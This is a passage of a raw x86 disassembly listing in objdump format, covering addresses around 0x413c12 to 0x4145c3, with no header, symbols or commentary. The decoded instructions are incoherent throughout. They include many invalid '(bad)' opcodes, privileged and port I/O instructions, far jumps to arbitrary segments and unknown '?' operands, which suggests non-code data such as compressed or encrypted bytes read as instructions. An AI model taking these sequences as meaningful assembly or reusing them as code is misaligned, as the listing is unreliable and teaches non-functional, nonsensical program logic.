  413c12:	int    0xda
  413c14:	cdq    
  413c15:	jl     0x413c95
  413c17:	xor    bl,BYTE PTR [ebx-0x7837d538]
  413c1d:	ret    
  413c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c1f:	and    al,0xec
  413c21:	xor    DWORD PTR [esi],ebp
  413c23:	mov    WORD PTR [edx+eiz*4-0x1306a36a],fs
  413c2a:	fs mov ebx,0xd1035f19
  413c30:	in     eax,0x6a
  413c32:	sub    cl,bl
  413c34:	popf   
  413c35:	sub    al,0x29
  413c37:	imul   edi,DWORD PTR [esi],0xddabb424
  413c3d:	es gs (bad) 
  413c40:	(bad)  
  413c41:	mov    esp,0x3af3e4fc
  413c46:	test   al,0xfc
  413c48:	sbb    al,0x60
  413c4a:	sub    esi,DWORD PTR [ebp-0x53]
  413c4d:	mov    esi,0x8d164e73
  413c52:	push   esp
  413c53:	or     al,0xc2
  413c55:	je     0x413c14
  413c57:	dec    edi
  413c58:	mov    bh,0xe6
  413c5a:	ret    0xd1df
  413c5d:	adc    dl,bl
  413c5f:	xchg   BYTE PTR [eax+0x8],dl
  413c62:	push   ecx
  413c63:	popa   
  413c64:	sti    
  413c65:	cld    
  413c66:	mov    edx,0x2438b804
  413c6b:	std    
  413c6c:	repz shl DWORD PTR [edx-0x5904206a],0xc0
  413c74:	jo     0x413ca6
  413c76:	into   
  413c77:	out    0xe6,eax
  413c79:	mov    bh,0xd5
  413c7b:	and    BYTE PTR [di],bh
  413c7e:	adc    edi,DWORD PTR [edi+0x5d]
  413c81:	mov    edi,0xe5ed27e
  413c86:	retf   
  413c87:	xchg   edi,eax
  413c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c89:	mov    bl,0x4e
  413c8b:	dec    edx
  413c8c:	sbb    eax,0x7296b065
  413c91:	lods   al,BYTE PTR ds:[esi]
  413c92:	(bad)  
  413c93:	pusha  
  413c94:	pop    ecx
  413c95:	aam    0x4e
  413c97:	dec    ebp
  413c98:	mov    cl,0x14
  413c9a:	fistp  WORD PTR [esi+0x54e35d32]
  413ca0:	outs   dx,BYTE PTR ds:[esi]
  413ca1:	out    0x9,al
  413ca3:	dec    ebp
  413ca4:	pop    ss
  413ca5:	mov    al,0x65
  413ca7:	sbb    eax,0xe8e42450
  413cac:	dec    esi
  413cad:	test   al,0x4d
  413caf:	cmp    al,ch
  413cb1:	fimul  WORD PTR [ecx-0x6]
  413cb4:	fmul   QWORD PTR es:[ecx]
  413cb7:	mov    edx,0xadb99ede
  413cbc:	dec    DWORD PTR [esi+0x46]
  413cbf:	aas    
  413cc0:	in     al,0x3
  413cc2:	outs   dx,BYTE PTR ds:[esi]
  413cc3:	inc    ebx
  413cc4:	mov    eax,ds:0xf9fce03b
  413cc9:	dec    eax
  413cca:	sbb    DWORD PTR [eax+0xcf53588],esi
  413cd0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413cd2:	fwait
  413cd3:	cmp    DWORD PTR ds:0xd95654ed,ebp
  413cd9:	push   0x67
  413cdb:	jp     0x413cbb
  413cdd:	aaa    
  413cde:	or     al,0x37
  413ce0:	leave  
  413ce1:	in     eax,dx
  413ce2:	jae    0x413cf2
  413ce4:	mov    esi,0xcb06d74c
  413ce9:	test   eax,0x850dff20
  413cee:	(bad)  
  413cef:	or     dl,bl
  413cf1:	inc    edx
  413cf2:	or     al,0x80
  413cf4:	out    dx,al
  413cf5:	push   eax
  413cf6:	dec    esi
  413cf7:	call   FWORD PTR [ebp+edi*4+0xd]
  413cfb:	cld    
  413cfc:	aas    
  413cfd:	rol    BYTE PTR [ecx],0xb
  413d00:	rol    BYTE PTR [eax],cl
  413d02:	push   edx
  413d03:	push   edx
  413d04:	mov    dh,0xbe
  413d06:	sbb    ebx,DWORD PTR [ebp+0x7815a989]
  413d0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d0d:	outs   dx,BYTE PTR ds:[esi]
  413d0e:	outs   dx,BYTE PTR ds:[esi]
  413d0f:	inc    edx
  413d10:	inc    esi
  413d11:	test   eax,0x4a79006
  413d16:	push   cs
  413d17:	fisub  WORD PTR cs:[ebp+0x34]
  413d1b:	inc    eax
  413d1c:	mov    eax,ds:0xd88ce174
  413d21:	sub    dh,al
  413d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d24:	(bad)  
  413d26:	push   ebp
  413d27:	push   esi
  413d28:	or     al,0x3d
  413d2a:	jg     0x413d00
  413d2c:	loopne 0x413cf7
  413d2e:	shr    ebx,0x9e
  413d31:	dec    ebx
  413d32:	xchg   esi,eax
  413d33:	imul   edi,edx,0xffffff91
  413d36:	mov    DWORD PTR es:[edi+0x6d8d55e1],edx
  413d3d:	adc    eax,0xdcbb360c
  413d42:	scas   eax,DWORD PTR es:[edi]
  413d43:	loope  0x413d99
  413d45:	int3   
  413d46:	(bad)  
  413d48:	or     al,0x18
  413d4a:	push   ebx
  413d4b:	xchg   ecx,eax
  413d4c:	cli    
  413d4d:	ss data16 xor ah,dh
  413d51:	loop   0x413d5e
  413d53:	xchg   edi,esi
  413d55:	sub    DWORD PTR [ebp+0x61624a8],ecx
  413d5b:	pop    edi
  413d5c:	pop    ss
  413d5d:	pusha  
  413d5e:	nop
  413d5f:	fwait
  413d60:	add    ah,BYTE PTR [ebp+0x3d147c0e]
  413d66:	clc    
  413d67:	and    dh,bl
  413d69:	add    al,0x42
  413d6b:	fwait
  413d6c:	push   esp
  413d6d:	mov    dl,0x69
  413d6f:	inc    esi
  413d70:	sar    DWORD PTR ds:[ecx+edx*4-0x14],1
  413d75:	push   cs
  413d76:	ins    DWORD PTR es:[edi],dx
  413d77:	rcl    DWORD PTR [ecx-0x47341744],0x33
  413d7e:	icebp  
  413d7f:	mov    esp,0x23c0f008
  413d84:	xor    edi,DWORD PTR [edi+edi*2]
  413d87:	addr16 dec edx
  413d89:	push   cs
  413d8a:	arpl   di,ax
  413d8c:	dec    ebp
  413d8d:	cld    
  413d8e:	aam    0x28
  413d90:	scas   eax,DWORD PTR es:[edi]
  413d91:	inc    ecx
  413d92:	lahf   
  413d93:	xchg   ebx,eax
  413d94:	mov    ?,ecx
  413d96:	in     eax,0xd0
  413d98:	cld    
  413d99:	call   0xdb139a74
  413d9e:	sbb    ah,BYTE PTR [eax-0x5d64b38c]
  413da4:	adc    al,0xad
  413da6:	push   0xed7d5c90
  413dab:	push   edi
  413dac:	add    DWORD PTR [esp+eax*2+0x51],esi
  413db0:	fdivr  st,st(1)
  413db2:	xchg   ecx,eax
  413db3:	outs   dx,DWORD PTR ds:[esi]
  413db4:	sbb    al,0xae
  413db6:	adc    eax,0xc373baf2
  413dbb:	repnz test al,0xed
  413dbe:	and    al,0x1a
  413dc0:	cli    
  413dc1:	jmp    0x4221:0x703487f
  413dc8:	ins    DWORD PTR es:[edi],dx
  413dc9:	adc    ebp,DWORD PTR ds:0xf8cc6ba9
  413dcf:	frstor [ecx-0x8]
  413dd2:	pop    es
  413dd3:	xlat   BYTE PTR ds:[ebx]
  413dd4:	stc    
  413dd5:	(bad)  
  413dd6:	mov    cl,0x81
  413dd8:	sbb    BYTE PTR [edx+eiz*1-0x96bdc7e],dl
  413ddf:	add    BYTE PTR [edi-0x4579d075],cl
  413de5:	or     BYTE PTR [ebp-0x64d6871e],al
  413deb:	leave  
  413dec:	not    BYTE PTR [eax]
  413dee:	cmp    eax,0xa7ac1651
  413df3:	jne    0x413db7
  413df5:	xchg   edx,eax
  413df6:	dec    edx
  413df7:	ret    
  413df8:	push   0x63
  413dfa:	sbb    eax,0x53249e32
  413dff:	in     al,0xa
  413e01:	dec    esp
  413e02:	cmp    al,bh
  413e04:	int    0xba
  413e06:	gs jbe 0x413dcd
  413e09:	mov    ebx,0x739128d3
  413e0e:	hlt    
  413e0f:	mov    eax,ds:0x523c5805
  413e14:	loope  0x413e53
  413e16:	add    BYTE PTR [esi-0x34],ah
  413e19:	and    BYTE PTR [edi],al
  413e1b:	fcom   QWORD PTR ds:0x8cd6d5d4
  413e21:	jmp    0xb6dc615
  413e26:	cwde   
  413e27:	lds    edx,FWORD PTR [ebx+0x69]
  413e2a:	xchg   esp,eax
  413e2b:	popa   
  413e2c:	jbe    0x413dbf
  413e2e:	mov    cl,0xac
  413e30:	ss and eax,0xe011a750
  413e36:	sub    eax,0x51e85e58
  413e3b:	addr16 jbe 0x413ebb
  413e3e:	push   esp
  413e3f:	js     0x413e6e
  413e41:	vunpckhps ymm7,ymm3,ymm1
  413e45:	push   cs
  413e46:	ror    DWORD PTR [esi],cl
  413e48:	jge    0x413e65
  413e4a:	xor    edx,DWORD PTR [eax+0x7c]
  413e4d:	mov    esp,DWORD PTR ds:0x393538e0
  413e53:	mov    edi,0x8789285a
  413e58:	js     0x413ed5
  413e5a:	shl    BYTE PTR [ebx],cl
  413e5c:	or     ebx,esi
  413e5e:	lds    ecx,FWORD PTR [ebx]
  413e60:	sbb    BYTE PTR [eax-0x56],dh
  413e63:	out    0x7d,al
  413e65:	sub    BYTE PTR [ebp-0x31],dl
  413e68:	ja     0x413e65
  413e6a:	popf   
  413e6b:	test   BYTE PTR [edi-0x1e7ef3b1],bl
  413e71:	or     edi,edi
  413e73:	cmp    eax,0x9e57a212
  413e78:	push   cs
  413e79:	pushf  
  413e7a:	push   0x1f
  413e7c:	adc    DWORD PTR [ecx-0x56],0x47b6399a
  413e83:	sbb    eax,0xb88e8ec5
  413e88:	cmp    DWORD PTR [edx-0x1e044957],eax
  413e8e:	mov    ebp,fs
  413e90:	xor    cl,BYTE PTR [ecx+0x167f743a]
  413e96:	cdq    
  413e97:	ds sbb al,0x6a
  413e9a:	pop    ds
  413e9b:	daa    
  413e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e9d:	pop    edi
  413e9e:	mov    al,0x58
  413ea0:	push   0xedfeb06e
  413ea5:	cmp    eax,0xed7e03ec
  413eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eab:	int    0xf1
  413ead:	push   0x67
  413eaf:	shl    BYTE PTR ds:0x39b0d318,1
  413eb5:	fbld   TBYTE PTR [edx]
  413eb7:	dec    edi
  413eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eb9:	push   ss
  413eba:	cs icebp 
  413ebc:	xor    BYTE PTR [ebp+0xe],cl
  413ebf:	arpl   sp,bx
  413ec1:	hlt    
  413ec2:	dec    ecx
  413ec3:	sub    BYTE PTR [esi+0x1e],0x74
  413ec7:	leave  
  413ec8:	inc    edx
  413ec9:	mov    edi,0x857336dc
  413ece:	fnsave [ebx+ebp*1-0x3bcccd16]
  413ed5:	sub    BYTE PTR [edx+0x12],cl
  413ed8:	push   ebp
  413ed9:	xor    eax,0x7e79bd3b
  413ede:	(bad)  
  413edf:	rdmsr  
  413ee1:	shr    eax,1
  413ee3:	xor    eax,0x218f8cf5
  413ee8:	adc    al,0x88
  413eea:	mov    ds:0xe0162068,eax
  413eef:	push   es
  413ef0:	and    DWORD PTR [eax+0x64],esp
  413ef3:	int3   
  413ef4:	es js  0x413f35
  413ef7:	mov    ebx,0xaf52fe9c
  413efc:	sbb    eax,0x79f8f40c
  413f01:	outs   dx,BYTE PTR fs:[esi]
  413f03:	adc    BYTE PTR [ecx],bh
  413f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f06:	out    0x39,al
  413f08:	jge    0x413f45
  413f0a:	call   0xab889802
  413f0f:	pop    ecx
  413f10:	dec    eax
  413f11:	mov    ebx,0x612fcaa7
  413f16:	clc    
  413f17:	inc    ecx
  413f18:	mov    cl,0x30
  413f1a:	(bad)  
  413f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f1c:	and    edi,DWORD PTR [ebp-0x7c980a7e]
  413f22:	je     0x413f20
  413f24:	mov    edx,0x38a96f2d
  413f29:	sti    
  413f2a:	call   FWORD PTR [edi+0x51cb4fb0]
  413f30:	in     eax,dx
  413f31:	xlat   BYTE PTR ds:[ebx]
  413f32:	mov    ds:0xe6e7bd7d,al
  413f37:	fwait
  413f38:	ret    
  413f39:	cmp    BYTE PTR [edx+0x3a],dh
  413f3c:	scas   al,BYTE PTR es:[edi]
  413f3d:	scas   eax,DWORD PTR es:[edi]
  413f3e:	loope  0x413fb3
  413f40:	into   
  413f41:	shl    DWORD PTR cs:[edx+0x0],1
	...
  414118:	push   ebx
  414119:	inc    edx
  41411a:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  414121:	pop    eax
  414122:	cdq    
  414123:	ror    DWORD PTR [eax-0x5e874b2f],0x53
  41412a:	add    DWORD PTR [eax],eax
  41412c:	and    al,BYTE PTR [edi]
  41412e:	add    BYTE PTR [eax],al
  414130:	mov    cl,0x99
  414132:	(bad)  
  414133:	jne    0x4140e1
  414135:	retf   0x560a
  414138:	ja     0x414111
  41413a:	dec    edx
  41413b:	aas    
  41413c:	pop    ss
  41413d:	repnz lahf 
  41413f:	xor    eax,0x47f9e070
  414144:	pusha  
  414145:	add    BYTE PTR [ebx],al
  414147:	ds cmp eax,0x96f2e317
  41414d:	pop    ds
  41414e:	jne    0x4140e1
  414150:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414152:	or     al,0xc0
  414155:	and    BYTE PTR [ebp-0x57],ah
  414158:	shr    BYTE PTR [edi-0x136ece85],1
  41415e:	icebp  
  41415f:	mov    bh,0x61
  414161:	mov    al,0x82
  414163:	or     eax,0x687baa8c
  414168:	pop    edi
  414169:	mov    ds:0xe70b3da,al
  41416e:	in     al,dx
  41416f:	daa    
  414170:	xchg   esi,eax
  414171:	mov    ah,0x87
  414173:	pop    edi
  414174:	pop    esp
  414175:	push   ebp
  414176:	lods   eax,DWORD PTR ds:[esi]
  414177:	mov    esp,0x9e63e4b5
  41417c:	jbe    0x4141de
  41417e:	cld    
  41417f:	inc    esp
  414180:	or     al,0x5a
  414182:	xor    BYTE PTR [ecx+eiz*1+0x209a25a8],ah
  414189:	dec    eax
  41418a:	add    BYTE PTR [edx-0x48e5f590],ch
  414190:	out    0x10,al
  414192:	jns    0x414184
  414194:	cmp    DWORD PTR ds:0x73196ace,0xffffffd4
  41419b:	daa    
  41419c:	(bad)  
  41419d:	hlt    
  41419e:	cmp    eax,0x15a72955
  4141a3:	fdiv   st(2),st
  4141a5:	stos   BYTE PTR es:[edi],al
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	(bad)  
  4141a8:	mov    dh,0x4b
  4141aa:	inc    esp
  4141ab:	ja     0x41421a
  4141ad:	jnp    0x4141b6
  4141af:	mov    edx,0x5437f05c
  4141b4:	lods   eax,DWORD PTR ds:[esi]
  4141b5:	iret   
  4141b6:	mov    ebx,0x5e87dff7
  4141bb:	ror    BYTE PTR [eax+0x1f73b150],cl
  4141c1:	nop
  4141c2:	pop    es
  4141c3:	sub    edi,DWORD PTR gs:[eax-0x598b4835]
  4141ca:	and    ebx,DWORD PTR [ebx-0x11]
  4141cd:	mov    al,ds:0xb99216fd
  4141d2:	int    0x9d
  4141d4:	dec    edi
  4141d5:	xchg   DWORD PTR [edx+edx*4],ebx
  4141d8:	sahf   
  4141d9:	pusha  
  4141da:	inc    edx
  4141db:	xor    eax,0xf010436d
  4141e0:	pusha  
  4141e1:	aas    
  4141e2:	fnstsw ax
  4141e4:	shr    DWORD PTR [ebp-0x1f1e49dc],1
  4141ea:	in     eax,dx
  4141eb:	nop
  4141ec:	in     al,0x61
  4141ee:	test   BYTE PTR [ebp+0x71],dh
  4141f1:	jno    0x4141ad
  4141f3:	test   BYTE PTR [edx],0x35
  4141f6:	das    
  4141f7:	rcr    esi,cl
  4141f9:	int    0x49
  4141fb:	ds es repnz cmp eax,0x35af3bb3
  414203:	or     ebp,ecx
  414205:	cmp    al,0xdf
  414207:	mov    ebx,0xea8773e3
  41420c:	inc    edi
  41420d:	jmp    0x41420e
  41420f:	lods   eax,DWORD PTR ds:[esi]
  414210:	outs   dx,BYTE PTR ds:[esi]
  414211:	xchg   edi,eax
  414212:	ja     0x41425c
  414214:	pop    es
  414215:	shl    BYTE PTR [edx],1
  414217:	rcr    DWORD PTR [ebp-0x7fbc4223],cl
  41421d:	adc    bh,ch
  41421f:	mov    BYTE PTR [esi+0x14049c15],al
  414225:	mov    eax,ds:0xb3f26247
  41422a:	jp     0x4141d5
  41422c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41422d:	inc    esi
  41422e:	jle    0x4141f8
  414230:	pop    ds
  414231:	test   BYTE PTR [edx+0x29],bl
  414234:	loop   0x41424f
  414236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414237:	outs   dx,BYTE PTR ds:[esi]
  414238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414239:	mov    ch,0xc7
  41423b:	jecxz  0x4141f7
  41423d:	push   ds
  41423e:	inc    ebx
  41423f:	and    ch,dh
  414241:	pusha  
  414242:	mov    DWORD PTR [ebp+0x59166a3a],edx
  414248:	(bad)  
  414249:	sub    BYTE PTR ss:[ecx+0x7eb2f73f],ah
  414250:	push   cs
  414251:	inc    edx
  414252:	cmp    al,0xd7
  414254:	out    dx,eax
  414255:	adc    DWORD PTR [edi+0xa358529],ebx
  41425b:	xchg   ebp,eax
  41425c:	adc    BYTE PTR [edi+edx*2+0xa3d831f],bh
  414263:	jg     0x414214
  414265:	xor    ecx,DWORD PTR [ecx-0x761d960f]
  41426b:	push   esp
  41426c:	add    BYTE PTR [ecx],0xa6
  41426f:	scas   eax,DWORD PTR es:[edi]
  414270:	gs pop es
  414272:	retf   
  414273:	cmp    bl,al
  414275:	dec    esi
  414276:	ds std 
  414278:	xor    ecx,DWORD PTR [esi]
  41427a:	inc    edx
  41427b:	test   BYTE PTR [ebx+ebx*4+0x44474b0c],ch
  414282:	lods   al,BYTE PTR ds:[esi]
  414283:	ret    
  414284:	mov    ds:0xc39dfa07,al
  414289:	and    eax,0x5c3b0bf1
  41428e:	pop    esp
  41428f:	jnp    0x41425b
  414291:	adc    DWORD PTR [ecx],0xffffff85
  414294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414295:	imul   edi,DWORD PTR [ecx-0x7e],0x57
  414299:	je     0x4142b5
  41429b:	jmp    0xbb74:0xf7dfcb67
  4142a2:	call   0x2b9b:0x3866c5f2
  4142a9:	test   eax,0xce242621
  4142ae:	sbb    DWORD PTR ds:0x8de037b1,edx
  4142b4:	outs   dx,BYTE PTR ds:[esi]
  4142b5:	loop   0x4142b0
  4142b7:	(bad)  
  4142b9:	jecxz  0x4142e3
  4142bb:	sar    BYTE PTR [edi+0x40],1
  4142be:	or     BYTE PTR [eax*8+0x1fe2083c],ch
  4142c5:	test   DWORD PTR [ecx-0x65],esi
  4142c8:	add    eax,0xe9788a7
  4142cd:	sbb    ecx,eax
  4142cf:	and    DWORD PTR [esi-0x8],edi
  4142d2:	jge    0x414288
  4142d4:	pop    ebx
  4142d5:	sub    bh,dh
  4142d7:	inc    edx
  4142d8:	push   0x4b46ef6a
  4142dd:	test   al,0xe0
  4142df:	fstp   DWORD PTR ds:0x9b53cdbf
  4142e5:	sbb    ah,BYTE PTR [ecx-0x26]
  4142e8:	repnz sub BYTE PTR [esi+0x67],ah
  4142ec:	push   ds
  4142ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ee:	dec    esi
  4142ef:	int3   
  4142f0:	xchg   esi,eax
  4142f1:	loope  0x414326
  4142f3:	xor    al,0x23
  4142f5:	mov    WORD PTR es:[edx-0x78],ss
  4142f9:	inc    edi
  4142fa:	jns    0x414287
  4142fc:	jl     0x4142da
  4142fe:	mov    ebp,0x454c813a
  414303:	in     eax,0x49
  414305:	(bad)  
  414306:	popa   
  414307:	arpl   WORD PTR [edi+0x6],ax
  41430a:	add    eax,0x3804cd8e
  41430f:	mov    bh,0xe7
  414311:	mov    bh,0x93
  414313:	lock enter 0xc9a1,0xaf
  414318:	push   edx
  414319:	les    ebx,FWORD PTR [ecx]
  41431b:	(bad)  
  41431d:	rcr    BYTE PTR [edx-0x13ecaa74],1
  414323:	mov    eax,ds:0xd088f459
  414328:	mov    eax,0x70bfdb21
  41432d:	scas   eax,DWORD PTR es:[edi]
  41432e:	adc    BYTE PTR [ebx],cl
  414330:	sbb    BYTE PTR [ebp-0x30d8335d],ah
  414336:	and    BYTE PTR [edi],dl
  414338:	mov    eax,0xe0091444
  41433d:	fdivr  st,st(6)
  41433f:	inc    esp
  414340:	dec    esi
  414341:	out    dx,eax
  414342:	ins    BYTE PTR es:[edi],dx
  414343:	jmp    0xe810:0xc90e6305
  41434a:	dec    esp
  41434b:	adc    bh,bh
  41434d:	inc    edx
  41434e:	dec    ecx
  41434f:	inc    esi
  414350:	retf   0xc290
  414353:	fwait
  414354:	pop    ecx
  414355:	pop    eax
  414356:	mov    bh,0xc
  414358:	rcr    esi,0x38
  41435b:	icebp  
  41435c:	mov    ah,0x6c
  41435e:	adc    edi,DWORD PTR [edi-0x5c]
  414361:	cdq    
  414362:	lods   al,BYTE PTR ds:[esi]
  414363:	cmp    al,ch
  414365:	pop    edx
  414366:	dec    eax
  414367:	push   cs
  414368:	sbb    bl,cl
  41436a:	pusha  
  41436b:	sbb    ebx,DWORD PTR [edx-0x19]
  41436e:	sbb    al,0xb0
  414370:	dec    esp
  414371:	cmp    ah,BYTE PTR [eax*2-0x7eaa354b]
  414378:	jns    0x4143bb
  41437a:	bound  ebx,QWORD PTR [eax+0x6050eaeb]
  414380:	push   ecx
  414381:	outs   dx,DWORD PTR ds:[esi]
  414382:	mov    al,0xee
  414384:	sub    al,0x14
  414386:	dec    eax
  414387:	cmp    eax,0xc24b382
  41438c:	jno    0x4143d8
  41438e:	fwait
  41438f:	dec    eax
  414390:	add    DWORD PTR [esi],0x350ea6fb
  414396:	pusha  
  414397:	sbb    dl,bl
  414399:	xchg   DWORD PTR [ecx],edi
  41439b:	aam    0x57
  41439d:	out    0x1f,al
  41439f:	(bad)  [esi]
  4143a1:	adc    bh,BYTE PTR [eax+0x7f]
  4143a4:	jne    0x41440b
  4143a6:	push   ss
  4143a7:	rcr    eax,cl
  4143a9:	inc    esi
  4143aa:	out    0x5e,al
  4143ac:	aaa    
  4143ad:	mov    cl,0x11
  4143af:	xor    eax,0x1cf48d59
  4143b4:	ss ins BYTE PTR es:[edi],dx
  4143b6:	fsub   st(1),st
  4143b8:	push   es
  4143b9:	repz push ds
  4143bb:	xchg   ecx,eax
  4143bc:	jo     0x41439c
  4143be:	fs pop eax
  4143c0:	mov    ah,0x6b
  4143c2:	or     dl,BYTE PTR [ebp+0x6d]
  4143c5:	add    eax,0x33e23a37
  4143ca:	xchg   BYTE PTR [ecx+0x283e44b4],ch
  4143d0:	pop    esi
  4143d1:	add    al,0x37
  4143d3:	jno    0x41438a
  4143d5:	call   0x7b6d:0xf9e7da75
  4143dc:	mov    edi,0x81bfb558
  4143e1:	fdiv   DWORD PTR [esi+ecx*2+0x66]
  4143e5:	pusha  
  4143e6:	rol    BYTE PTR [edx+edi*8-0x65],cl
  4143ea:	adc    al,0x74
  4143ed:	xchg   edi,eax
  4143ee:	lea    ebp,ds:0x79317402
  4143f4:	dec    esp
  4143f5:	mov    ebx,0xcb8e9238
  4143fa:	mov    ebx,0x941f7577
  4143ff:	mov    eax,ds:0xde2d8746
  414404:	cmp    DWORD PTR [ebx],0x37
  414407:	push   ecx
  414408:	and    ebx,DWORD PTR ds:0xe0b7c373
  41440e:	jle    0x41439a
  414410:	xor    al,0x25
  414412:	bound  eax,QWORD PTR [eax]
  414414:	addr16 js 0x414411
  414417:	aaa    
  414418:	(bad)  
  414419:	dec    BYTE PTR [ecx+0x2c3ca38d]
  41441f:	xchg   ebx,eax
  414420:	jmp    0x414437
  414422:	in     al,0x27
  414424:	call   FWORD PTR [ebx]
  414426:	jle    0x4143d8
  414428:	push   ebx
  414429:	ret    
  41442a:	stos   DWORD PTR es:[edi],eax
  41442b:	xchg   ebp,eax
  41442c:	xchg   ecx,eax
  41442d:	outs   dx,DWORD PTR ds:[esi]
  41442e:	pop    es
  41442f:	sub    BYTE PTR [ebp+0x6b],dl
  414432:	popa   
  414433:	stos   BYTE PTR es:[edi],al
  414434:	mov    ds:0x3cdd689b,eax
  414439:	iret   
  41443a:	in     al,dx
  41443b:	mov    ds:0xd7622044,eax
  414440:	int3   
  414441:	mov    ch,0x20
  414443:	scas   al,BYTE PTR es:[edi]
  414444:	imul   eax,DWORD PTR [ebx-0x3bc08e27],0xffffff91
  41444b:	jl     0x4144bb
  41444d:	fdiv   QWORD PTR [edx+0x1f]
  414450:	inc    esp
  414451:	imul   eax,DWORD PTR [ebp-0x40],0xffffff80
  414455:	call   0x3d15b462
  41445a:	jle    0x4143e1
  41445c:	fldenv [ebx-0x1f7978ef]
  414462:	fild   DWORD PTR ds:0x7023c85b
  414468:	inc    eax
  414469:	and    DWORD PTR [ecx-0x233a4c74],edx
  41446f:	dec    esi
  414470:	ds loop 0x414470
  414473:	(bad)  
  414474:	sub    ah,ch
  414476:	and    DWORD PTR [esp+edi*2+0x1b],esp
  41447a:	jmp    0xeaff7377
  41447f:	ret    
  414480:	mov    dl,ch
  414482:	cdq    
  414483:	mov    WORD PTR [edi-0x37],fs
  414486:	sub    ah,BYTE PTR ds:0x31890def
  41448c:	je     0x414429
  41448e:	and    cl,BYTE PTR [ebx+0x39]
  414491:	sub    BYTE PTR [edi+0x26d167ee],0xbe
  414498:	lahf   
  414499:	jecxz  0x4144a7
  41449b:	data16 fisttp DWORD PTR [edi+esi*8+0x3721346c]
  4144a3:	xor    eax,0xa91558f9
  4144a8:	and    bh,dh
  4144aa:	inc    DWORD PTR [edi]
  4144ac:	mov    al,ds:0xd54fc9a3
  4144b1:	add    eax,0x4f4873f9
  4144b6:	mov    ebx,0x78643b48
  4144bb:	test   esi,esp
  4144bd:	mov    WORD PTR [ebx-0xb],ds
  4144c0:	je     0x4144a7
  4144c2:	retf   
  4144c3:	push   0x921f0bd
  4144c8:	xor    ebx,DWORD PTR [esi+0x5c]
  4144cb:	pop    ds
  4144cc:	repnz add dl,BYTE PTR [esi+0x33]
  4144d0:	xchg   esi,eax
  4144d1:	push   esi
  4144d2:	or     esp,esp
  4144d4:	adc    BYTE PTR [edx-0x72ca0ef2],0xa7
  4144db:	inc    ebx
  4144dc:	mov    ecx,DWORD PTR [edx-0x6f882197]
  4144e2:	jb     0x414464
  4144e4:	push   ds
  4144e5:	fstp   QWORD PTR [edx]
  4144e7:	imul   ecx,DWORD PTR ds:0x531a1bb7,0x1cb916e7
  4144f1:	push   ecx
  4144f2:	and    ebx,ebp
  4144f4:	arpl   WORD PTR [ecx+0x17a5e943],si
  4144fa:	hlt    
  4144fb:	xchg   esp,eax
  4144fc:	mov    ebp,0xfa3c6477
  414501:	aad    0x82
  414503:	rcr    DWORD PTR [ebx-0x52],cl
  414506:	xchg   esi,eax
  414507:	ror    DWORD PTR [edi-0x27fc16c4],cl
  41450d:	xchg   DWORD PTR [ebx],ebx
  41450f:	sub    bh,BYTE PTR [edi]
  414511:	hlt    
  414512:	pop    ds
  414513:	mov    dl,0x34
  414515:	or     al,0xa4
  414517:	mov    cl,0x73
  414519:	stos   DWORD PTR es:[edi],eax
  41451a:	in     al,dx
  41451b:	(bad)  
  41451c:	lahf   
  41451d:	shr    BYTE PTR [edi+0x38259116],0xfb
  414524:	leave  
  414525:	and    BYTE PTR [edx+0x4d],0x23
  414529:	bound  esp,QWORD PTR [ebp+0x42]
  41452c:	mov    DWORD PTR [edx+0x50],0x1a73e054
  414533:	ins    DWORD PTR es:[edi],dx
  414534:	jns    0x414574
  414536:	xchg   ebp,eax
  414537:	outs   dx,DWORD PTR ds:[esi]
  414538:	mov    ecx,0x66f1ab7a
  41453d:	dec    ebp
  41453e:	xor    BYTE PTR [ebx-0x1304daf0],dl
  414544:	je     0x414542
  414546:	mov    ecx,0xbfd8889f
  41454b:	hlt    
  41454c:	loop   0x414563
  41454e:	cmc    
  41454f:	fistp  WORD PTR [ebp-0x6887ef8f]
  414555:	fsub   DWORD PTR [ebp+0x407230ec]
  41455b:	jo     0x4145b7
  41455d:	fwait
  41455e:	add    edx,DWORD PTR [edx*2+0x658dc5d3]
  414565:	add    BYTE PTR [ebx-0x72],ch
  414568:	or     al,0xe3
  41456a:	sbb    edx,DWORD PTR [esi-0x2f2dccc1]
  414570:	add    edi,DWORD PTR [ecx]
  414572:	call   0x3a7658bb
  414577:	and    dl,ch
  414579:	hlt    
  41457a:	and    DWORD PTR [edx],ecx
  41457c:	mov    ebp,0xc2983a49
  414581:	add    al,0x94
  414583:	mov    ?,WORD PTR [edi+edi*4-0x79170ff0]
  41458a:	pop    eax
  41458b:	call   0x38b5:0x5da1e7c3
  414592:	test   DWORD PTR [ebx+0x643de6c5],ebx
  414598:	or     BYTE PTR [ebx],bh
  41459a:	inc    ecx
  41459b:	adc    DWORD PTR [ebx-0x12],eax
  41459e:	ins    DWORD PTR es:[edi],dx
  41459f:	js     0x414589
  4145a1:	ds cld 
  4145a3:	dec    ebp
  4145a4:	sub    ebp,DWORD PTR [ebx]
  4145a6:	stos   BYTE PTR es:[edi],al
  4145a7:	mov    ecx,DWORD PTR [ecx-0x78]
  4145aa:	fsubr  QWORD PTR [ebp-0x1d]
  4145ad:	and    BYTE PTR [ebp+0x35],0x26
  4145b1:	inc    ecx
  4145b2:	aas    
  4145b3:	movzx  esp,WORD PTR [ebp+eax*1+0x5f31e6c9]
  4145bb:	icebp  
  4145bc:	mov    esp,0x9d929dba
  4145c1:	test   DWORD PTR [esi],esp
  4145c3:	sbb    DWORD PTR [edi+0x42f83e45],ebx
